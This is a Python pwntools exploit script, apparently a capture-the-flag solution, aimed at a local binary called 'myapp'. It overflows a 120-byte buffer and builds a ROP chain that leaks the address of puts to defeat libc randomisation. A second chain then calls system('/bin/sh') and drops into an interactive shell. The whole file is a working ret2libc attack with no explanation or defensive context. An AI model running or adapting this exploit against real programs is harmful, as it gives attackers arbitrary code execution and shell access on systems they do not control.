#!/usr/bin/python3
from pwn import process, p64, u64

shell = process("./myapp")

offset = 120
junk = b"A" * offset

payload =  b""
payload += junk
payload += p64(0x40120b) # pop rdi; ret;
payload += p64(0x404018) # puts@got
payload += p64(0x401030) # puts@plt
payload += p64(0x40115f) # main()

shell.sendline(payload)
shell.recvlines(3)

libc_base = u64(shell.recvline().strip().ljust(8, b"\x00")) - 0x68f90

payload  = b""
payload += junk
payload += p64(libc_base + 0x01fc6a) # pop rdi; ret;
payload += p64(libc_base + 0x161c19) # "/bin/sh"
payload += p64(libc_base + 0x03f480) # system()

shell.sendline(payload)
shell.recvlines(3)

shell.interactive()
